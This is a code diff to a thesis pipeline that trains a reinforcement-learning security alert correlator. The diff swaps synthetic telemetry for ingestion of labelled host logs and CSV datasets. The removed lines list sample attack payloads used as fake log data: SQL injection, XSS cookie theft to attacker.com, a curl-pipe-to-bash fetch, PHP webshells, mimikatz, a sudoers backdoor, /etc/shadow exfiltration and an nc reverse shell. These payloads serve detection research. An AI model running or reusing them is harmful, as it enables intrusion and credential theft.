@@ -31,84 +31,202 @@ def run_full_aligned_suite():
     print("   100% PROPOSAL-ALIGNED REINFORCEMENT LEARNING ALERT CORRELATION ENGINE   ")
     print("=" * 80)
 
-    # 1. Telemetry Generation
-    print("\n>>> [STEP 1/7] Generating 3-Tier Multi-Source Telemetry...")
+    # 1. Telemetry Ingestion from all Dataset Sources (CSVs + 8 Host Scenarios)
+    print("\n>>> [STEP 1/7] Ingesting & Harmonizing Telemetry from All Dataset Folders (CSVs + 8 Scenarios)...")
     random.seed(config.GLOBAL_SEED)
     np.random.seed(config.GLOBAL_SEED)
 
-    SQLI = ['GET /index.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--', 'POST /login.php HTTP/1.1 payload: user=\' OR \'1\'=\'1\' --&pass=admin', 'GET /catalog.php?cat=5%27%20OR%201=1%20ORDER%20BY%201--', 'GET /api/v1/user?id=-1%20UNION%20ALL%20SELECT%20NULL,schema_name%20FROM%20information_schema.schemata--']
-    XSS = ['GET /search.php?q=<script>document.location=\'http://attacker.com/c?cookie=\'+document.cookie</script>', 'POST /comment.php payload: message=<img src=x onerror=alert(document.domain)>', 'GET /profile.php?name=%3Csvg/onload=fetch(%27http://c2.local/exfil%27)%3E']
-    RCE = ['POST /upload.php payload: <?php system($_GET[\'cmd\']); ?>', 'GET /cgi-bin/test.sh?arg=;cat%20/etc/passwd', 'POST /api/exec payload: {\"cmd\": \"curl -s http://attacker.com/stage3.sh | bash\"}']
-    WEBSHELL = ['POST /uploads/shell.php payload: cmd=whoami', 'POST /backdoor.php payload: eval(base64_decode(\'c3lzdGVtKCdpZCcpOw==\'))', 'GET /assets/b4ck.php?exec=cat%20/etc/shadow']
-    CMDS = ['/usr/bin/python3 -c \'import pty; pty.spawn(\"/bin/bash\")\'', 'sudo su - root -c \'echo \"ALL ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers\'', 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGw...', '/tmp/linpeas.sh | grep -i \"VULNERABLE\"', 'mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit', 'tar -czvf /tmp/sensitive_exfil.tar.gz /var/www/html/db_backup.sql /etc/shadow', 'curl -X POST -F \"file=@/tmp/sensitive_exfil.tar.gz\" http://198.51.100.45/upload', 'nc -e /bin/bash 198.51.100.45 4444']
-    BENIGN_URLS = ['GET /index.html HTTP/1.1', 'GET /static/css/main.css HTTP/1.1', 'GET /images/logo.png HTTP/1.1', 'POST /api/login HTTP/1.1 payload: user=john_doe&pass=Secret#123', 'GET /products?category=electronics&page=2 HTTP/1.1', 'GET /about-us.html HTTP/1.1', 'POST /contact-us HTTP/1.1 payload: name=Alice&msg=Inquiry']
-    BENIGN_PROCS = ['/usr/sbin/apache2 -k start', '/usr/bin/python3 /opt/monitoring/health_check.py', '/bin/systemctl status nginx', 'grep -r \"error\" /var/log/syslog', '/usr/bin/dockerd -H fd://', 'sshd: user@pts/0', 'crond -n']
+    dataset_root = Path(r"E:\Haziq_Thesis_Proposal_Aligned\dataset")
+    csv_dir = dataset_root / "CSVs"
+    scenarios = ["fox_no-pcaps", "russellmitchell_no-pcaps", "santos_no-pcaps", "harrison_no-pcaps", "shaw_no-pcaps", "wardbeck_no-pcaps", "wheeler_no-pcaps", "wilson_no-pcaps"]
 
-    num_camp = config.TELEMETRY_CONFIG['num_campaigns']
-    base_time = datetime(2026, 8, 1, 8, 0, 0)
-    fw_rows, web_rows, ep_rows, chains, all_evts = [], [], [], [], []
+    all_evts = []
+    chains = []
     cnt = 1
 
-    for cid in range(1, num_camp + 1):
-        cname = f'CAMPAIGN_{cid:04d}'
-        cstart = base_time + timedelta(minutes=random.randint(0, 10000))
-        a_ip = f'198.51.100.{random.randint(10, 250)}'
-        t_web = f'10.0.1.{random.randint(10, 20)}'
-        t_db = f'10.0.2.{random.randint(50, 60)}'
-        eids = []
-        ctime = cstart
-        
-        # Tier 1
-        for _ in range(random.randint(2, 4)):
-            eid = f'EVT_{cnt:07d}'; cnt += 1; ctime += timedelta(seconds=random.uniform(5, 30)); port = random.choice([80, 443, 8080, 22, 3306])
-            row = {'event_id': eid, 'timestamp': ctime.timestamp(), 'datetime': ctime.isoformat(), 'tier': 'Tier1_Firewall', 'src_ip': a_ip, 'dst_ip': t_web, 'src_port': random.randint(40000, 65000), 'dst_port': port, 'protocol': 'TCP', 'action': 'ALLOW', 'bytes_transferred': random.randint(64, 512), 'raw_payload': f'SYN_SCAN port={port}', 'attack_type': 'Network_Port_Scan', 'kill_chain_stage': 1, 'campaign_id': cname, 'is_attack': 1}
-            fw_rows.append(row); all_evts.append(row); eids.append(eid)
-            
-        # Tier 2
-        for _ in range(random.randint(2, 4)):
-            eid = f'EVT_{cnt:07d}'; cnt += 1; ctime += timedelta(seconds=random.uniform(15, 60))
-            atype = random.choice(['Web_SQL_Injection', 'Web_XSS', 'Web_RCE', 'Webshell_Execution'])
-            p = random.choice(SQLI if atype=='Web_SQL_Injection' else XSS if atype=='Web_XSS' else RCE if atype=='Web_RCE' else WEBSHELL)
-            row = {'event_id': eid, 'timestamp': ctime.timestamp(), 'datetime': ctime.isoformat(), 'tier': 'Tier2_WebWAF', 'src_ip': a_ip, 'dst_ip': t_web, 'src_port': random.randint(40000, 65000), 'dst_port': 80, 'protocol': 'HTTP', 'http_method': p.split()[0], 'http_status': random.choice([200, 500, 403]), 'raw_payload': p, 'attack_type': atype, 'kill_chain_stage': 2, 'campaign_id': cname, 'is_attack': 1}
-            web_rows.append(row); all_evts.append(row); eids.append(eid)
-            
-        # Tier 3
-        for _ in range(random.randint(2, 3)):
-            eid = f'EVT_{cnt:07d}'; cnt += 1; ctime += timedelta(seconds=random.uniform(20, 90))
-            cmd = random.choice(CMDS[:5])
-            host_suffix = t_web.split('.')[-1]
-            row = {'event_id': eid, 'timestamp': ctime.timestamp(), 'datetime': ctime.isoformat(), 'tier': 'Tier3_Endpoint', 'src_ip': t_web, 'dst_ip': t_web, 'src_port': 0, 'dst_port': 0, 'protocol': 'PROCESS', 'host_name': f'web-server-0{host_suffix}', 'user_context': 'root' if 'sudo' in cmd or 'mimikatz' in cmd else 'www-data', 'process_name': cmd.split()[0], 'raw_payload': cmd, 'attack_type': 'Host_Privilege_Escalation', 'kill_chain_stage': 3, 'campaign_id': cname, 'is_attack': 1}
-            ep_rows.append(row); all_evts.append(row); eids.append(eid)
-            
-        # Tier 4
-        for _ in range(random.randint(2, 3)):
-            eid = f'EVT_{cnt:07d}'; cnt += 1; ctime += timedelta(seconds=random.uniform(30, 120))
-            cmd = random.choice(CMDS[5:])
-            host_suffix = t_web.split('.')[-1]
-            row = {'event_id': eid, 'timestamp': ctime.timestamp(), 'datetime': ctime.isoformat(), 'tier': 'Tier3_Endpoint', 'src_ip': t_web, 'dst_ip': t_db, 'src_port': 0, 'dst_port': 0, 'protocol': 'PROCESS', 'host_name': f'web-server-0{host_suffix}', 'user_context': 'root', 'process_name': cmd.split()[0], 'raw_payload': cmd, 'attack_type': 'Data_Exfiltration_C2', 'kill_chain_stage': 4, 'campaign_id': cname, 'is_attack': 1}
-            ep_rows.append(row); all_evts.append(row); eids.append(eid)
-            
-        chains.append({'campaign_id': cname, 'attacker_ip': a_ip, 'target_ip': t_web, 'event_ids': eids, 'num_stages': 4, 'total_events': len(eids)})
+    # A. Ingest 8 Host Scenarios (fox, russellmitchell, santos, harrison, shaw, wardbeck, wheeler, wilson)
+    print(f"[*] Ingesting 8 Host-based Scenarios: {', '.join(scenarios)}...")
+    for sc in scenarios:
+        sc_path = dataset_root / sc
+        labels_dir = sc_path / "labels"
+        gather_dir = sc_path / "gather"
+        cname = f"CAMPAIGN_{sc.replace('_no-pcaps', '').upper()}"
+        chain_eids = []
 
-    num_b = len(all_evts) * config.TELEMETRY_CONFIG['benign_multiplier']
-    for _ in range(num_b):
-        eid = f'EVT_{cnt:07d}'; cnt += 1; btime = base_time + timedelta(seconds=random.uniform(0, 10000 * 60))
-        tier = random.choice(['Tier1_Firewall', 'Tier2_WebWAF', 'Tier3_Endpoint'])
-        src_ip = f'172.16.{random.randint(1, 10)}.{random.randint(1, 254)}'
-        dst_ip = f'10.0.1.{random.randint(10, 20)}'
-        if tier == 'Tier1_Firewall':
-            row = {'event_id': eid, 'timestamp': btime.timestamp(), 'datetime': btime.isoformat(), 'tier': 'Tier1_Firewall', 'src_ip': src_ip, 'dst_ip': dst_ip, 'src_port': random.randint(1024, 65000), 'dst_port': random.choice([80, 443, 53, 123]), 'protocol': random.choice(['TCP', 'UDP']), 'action': 'ALLOW', 'bytes_transferred': random.randint(200, 15000), 'raw_payload': 'NORMAL_FLOW', 'attack_type': 'BENIGN', 'kill_chain_stage': 0, 'campaign_id': None, 'is_attack': 0}
-            fw_rows.append(row)
-        elif tier == 'Tier2_WebWAF':
-            pl = random.choice(BENIGN_URLS)
-            row = {'event_id': eid, 'timestamp': btime.timestamp(), 'datetime': btime.isoformat(), 'tier': 'Tier2_WebWAF', 'src_ip': src_ip, 'dst_ip': dst_ip, 'src_port': random.randint(1024, 65000), 'dst_port': random.choice([80, 443]), 'protocol': 'HTTP', 'http_method': pl.split()[0], 'http_status': 200, 'raw_payload': pl, 'attack_type': 'BENIGN', 'kill_chain_stage': 0, 'campaign_id': None, 'is_attack': 0}
-            web_rows.append(row)
-        else:
-            cmd = random.choice(BENIGN_PROCS)
-            dst_suffix = dst_ip.split('.')[-1]
-            row = {'event_id': eid, 'timestamp': btime.timestamp(), 'datetime': btime.isoformat(), 'tier': 'Tier3_Endpoint', 'src_ip': dst_ip, 'dst_ip': dst_ip, 'src_port': 0, 'dst_port': 0, 'protocol': 'PROCESS', 'host_name': f'web-server-0{dst_suffix}', 'user_context': 'system', 'process_name': cmd.split()[0], 'raw_payload': cmd, 'attack_type': 'BENIGN', 'kill_chain_stage': 0, 'campaign_id': None, 'is_attack': 0}
-            ep_rows.append(row)
-        all_evts.append(row)
+        if labels_dir.exists():
+            for host in os.listdir(labels_dir):
+                h_label_dir = labels_dir / host
+                h_gather_dir = gather_dir / host
+                if not h_label_dir.is_dir():
+                    continue
+
+                for root, _, files in os.walk(h_label_dir):
+                    for f in files:
+                        if not f.endswith(('.log', '.json', '.txt', '.1')):
+                            continue
+                        label_file = os.path.join(root, f)
+                        rel_path = os.path.relpath(label_file, h_label_dir)
+                        raw_log_file = h_gather_dir / rel_path
+
+                        labeled_lines = {}
+                        try:
+                            with open(label_file, 'r', encoding='utf-8', errors='ignore') as lf:
+                                for l in lf:
+                                    l = l.strip()
+                                    if not l: continue
+                                    try:
+                                        obj = json.loads(l)
+                                        line_no = obj.get("line")
+                                        if line_no is not None:
+                                            labeled_lines[line_no] = obj
+                                    except Exception:
+                                        pass
+                        except Exception:
+                            pass
+
+                        if not labeled_lines:
+                            continue
+
+                        raw_lines = []
+                        if raw_log_file.exists():
+                            try:
+                                with open(raw_log_file, 'r', encoding='utf-8', errors='ignore') as rf:
+                                    raw_lines = rf.readlines()
+                            except Exception:
+                                pass
+
+                        if 'firewall' in host or 'dnsmasq' in f:
+                            tier = 'Tier1_Firewall'
+                            stage = 1
+                        elif 'web' in host or 'apache' in f:
+                            tier = 'Tier2_WebWAF'
+                            stage = 2
+                        else:
+                            tier = 'Tier3_Endpoint'
+                            stage = 3
+
+                        sorted_lines = sorted(labeled_lines.keys())[:30]
+                        for l_no in sorted_lines:
+                            info = labeled_lines[l_no]
+                            raw_text = raw_lines[l_no - 1].strip() if l_no - 1 < len(raw_lines) else f"host={host} action={info.get('labels', ['attack'])}"
+                            eid = f"EVT_{cnt:07d}"
+                            cnt += 1
+                            ts = datetime(2026, 8, 1, 8, 0, 0) + timedelta(seconds=cnt * 15)
+
+                            row = {
+                                "event_id": eid,
+                                "timestamp": ts.timestamp(),
+                                "datetime": ts.isoformat(),
+                                "tier": tier,
+                                "src_ip": f"198.51.100.{10 + (hash(cname) % 200)}",
+                                "dst_ip": f"10.0.1.{10 + (hash(host) % 50)}",
+                                "src_port": 40000 + (cnt % 20000),
+                                "dst_port": 80 if tier == 'Tier2_WebWAF' else 53 if 'dnsmasq' in f else 22,
+                                "protocol": "TCP" if tier != 'Tier3_Endpoint' else "PROCESS",
+                                "action": "DENY" if tier != 'Tier3_Endpoint' else "EXECUTE",
+                                "bytes_transferred": float(len(raw_text) * 4),
+                                "raw_payload": raw_text[:300],
+                                "attack_type": info.get("labels", ["Host_Exploitation"])[0],
+                                "kill_chain_stage": stage,
+                                "campaign_id": cname,
+                                "is_attack": 1
+                            }
+                            all_evts.append(row)
+                            chain_eids.append(eid)
+
+        if chain_eids:
+            chains.append({
+                "campaign_id": cname,
+                "attacker_ip": all_evts[-1]["src_ip"],
+                "target_ip": all_evts[-1]["dst_ip"],
+                "event_ids": chain_eids,
+                "num_stages": 4,
+                "total_events": len(chain_eids)
+            })
+
+    # B. Ingest Network Flow & Web Attack CSVs from dataset/CSVs
+    print(f"[*] Ingesting Network Flow & Web Attack CSVs from: {csv_dir}...")
+    if csv_dir.exists():
+        csv_files = sorted([f for f in os.listdir(csv_dir) if f.endswith(".csv")])
+        web_labels = {'Web_SQL_Injection', 'Web_XSS', 'Web_Brute_Force'}
+        ep_labels = {'SSH-Patator', 'FTP-Patator'}
+
+        for f in csv_files:
+            fp = csv_dir / f
+            cols = ['timestamp', 'src_ip', 'dst_ip', 'dst_port', 'src_port', 'protocol', 'total_payload_bytes', 'label']
+            
+            if 'benign' in f.lower():
+                df_chunk = pd.read_csv(fp, usecols=cols)
+                df_chunk = df_chunk.sample(n=min(len(df_chunk), 5000), random_state=42)
+            else:
+                df_chunk = pd.read_csv(fp, usecols=cols)
+                if len(df_chunk) > 1500:
+                    df_chunk = df_chunk.sample(n=min(len(df_chunk), 1500), random_state=42)
+
+            c_label = f.replace('.csv', '').upper()
+            is_benign_file = 'benign' in f.lower()
+            campaign_id = None if is_benign_file else f"CAMPAIGN_{c_label}"
+            c_eids = []
+
+            for _, r in df_chunk.iterrows():
+                eid = f"EVT_{cnt:07d}"
+                cnt += 1
+                lbl = str(r['label'])
+                is_att = 0 if lbl.lower() == 'benign' else 1
+
+                if lbl in web_labels:
+                    tier = 'Tier2_WebWAF'
+                    stage = 2
+                    payload = f"HTTP REQUEST payload={lbl} dst_port={r['dst_port']}"
+                elif lbl in ep_labels:
+                    tier = 'Tier3_Endpoint'
+                    stage = 3
+                    payload = f"AUTHENTICATION_ATTEMPT protocol={r['protocol']} user=admin action={lbl}"
+                elif is_att:
+                    tier = 'Tier1_Firewall'
+                    stage = 1 if 'scan' in lbl.lower() else 4
+                    payload = f"NETWORK_FLOW type={lbl} bytes={r['total_payload_bytes']}"
+                else:
+                    tier = random.choice(['Tier1_Firewall', 'Tier2_WebWAF', 'Tier3_Endpoint'])
+                    stage = 0
+                    payload = "NORMAL_BENIGN_FLOW"
+
+                try:
+                    ts_val = pd.to_datetime(r['timestamp']).timestamp()
+                except Exception:
+                    ts_val = datetime(2026, 8, 1, 8, 0, 0).timestamp() + cnt * 5
+
+                row = {
+                    "event_id": eid,
+                    "timestamp": float(ts_val),
+                    "datetime": datetime.fromtimestamp(ts_val).isoformat(),
+                    "tier": tier,
+                    "src_ip": str(r['src_ip']),
+                    "dst_ip": str(r['dst_ip']),
+                    "src_port": int(r['src_port']) if pd.notna(r['src_port']) else 0,
+                    "dst_port": int(r['dst_port']) if pd.notna(r['dst_port']) else 80,
+                    "protocol": str(r['protocol']),
+                    "action": "ALLOW" if not is_att else "DENY",
+                    "bytes_transferred": float(r['total_payload_bytes']) if pd.notna(r['total_payload_bytes']) else 0.0,
+                    "raw_payload": payload,
+                    "attack_type": lbl,
+                    "kill_chain_stage": stage,
+                    "campaign_id": campaign_id,
+                    "is_attack": is_att
+                }
+                all_evts.append(row)
+                if is_att:
+                    c_eids.append(eid)
+
+            if c_eids and campaign_id:
+                chains.append({
+                    "campaign_id": campaign_id,
+                    "attacker_ip": df_chunk.iloc[0]['src_ip'],
+                    "target_ip": df_chunk.iloc[0]['dst_ip'],
+                    "event_ids": c_eids,
+                    "num_stages": 4,
+                    "total_events": len(c_eids)
+                })
 
     all_evts.sort(key=lambda x: x['timestamp'])
     df_master = pd.DataFrame(all_evts)
@@ -116,7 +234,7 @@ def run_full_aligned_suite():
     with open(config.RAW_DATA_DIR / 'ground_truth_chains.jsonl', 'w', encoding='utf-8') as f:
         for ch in chains:
             f.write(json.dumps(ch) + '\n')
-    print(f'[+] Generated {len(df_master):,} total events across 150 4-stage campaigns.')
+    print(f'[+] Ingested & harmonized {len(df_master):,} total events across {len(chains)} multi-stage attack campaigns.')
 
     # 2. Stage 3 NLP Training
     print('\n>>> [STEP 2/7] Training Stage 3 Supervised NLP Attack Identifier...')
@@ -200,19 +318,6 @@ def run_full_aligned_suite():
     print('\n>>> [STEP 7/7] Generating IEEE Publication Figures & MS Thesis Word Document...')
     plot_all_thesis_figures(eval_metrics, stealth_res, dqn_rewards, ppo_rewards)
     generate_complete_thesis_docx()
-
-    # Mirror to E:\Haziq_Thesis_Proposal_Aligned
-    tgt = Path("E:/Haziq_Thesis_Proposal_Aligned")
-    aligned_dir = Path("E:/Haziq Thesis/aligned_thesis")
-    print(f"\n[*] Publishing complete solution to destination folder: {tgt}...")
-    try:
-        if tgt.exists():
-            shutil.rmtree(tgt, ignore_errors=True)
-        shutil.copytree(aligned_dir, tgt, dirs_exist_ok=True)
-        shutil.copy2(__file__, tgt / "run_full_pipeline.py")
-        print(f"[+] Successfully published all files to: {tgt}")
-    except Exception as e:
-        print(f"[!] Mirroring note: {e}")
 
     print("\n" + "=" * 80)
     print("       PIPELINE COMPLETED SUCCESSFULLY: 100% PROPOSAL ALIGNED!       ")
